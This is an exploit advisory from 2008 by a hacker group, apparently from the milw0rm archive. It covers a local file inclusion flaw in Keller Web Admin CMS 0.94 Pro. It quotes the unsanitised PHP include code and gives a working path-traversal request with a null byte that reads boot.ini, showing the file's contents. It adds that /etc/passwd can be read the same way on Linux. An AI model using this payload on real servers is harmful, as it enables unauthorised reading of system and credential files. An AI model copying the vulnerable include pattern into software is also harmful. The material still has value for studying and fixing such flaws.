@@ -1,0 +1,71 @@
+===========================================================
+  Keller Web Admin CMS Local File Inclusion Vulnerability
+===========================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 26 June 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : Keller Web Admin CMS
+ VERSION     : 0.94 Pro
+ VENDOR      : N/A
+ DOWNLOAD    : http://downloads.sourceforge.net/kwa
+#####################################################
+
+--- Local File Inclusion ---
+
+-------------------------------------
+ Vulnerable File [/Public/index.php]
+-------------------------------------
+
+@Line 
+
+   21:  if (isset($_GET['action'])) {
+   22:  $action=$_GET['action'];
+   23:	$inclConfig = $includeFolder.$action.".inc.php";
+   24:	include($inclConfig);
+   25:	header('Location: '.$clnt_referer);
+   26:	die();
+   27:  }
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[kwa_path]/Public/index.php?action=[LFI]
+
+-------------
+ POC Exploit
+-------------
+
+[+] http://192.168.24.25/kwa/Public/index.php?action=../../../../../../../../boot.ini%00
+
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS.
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-26]
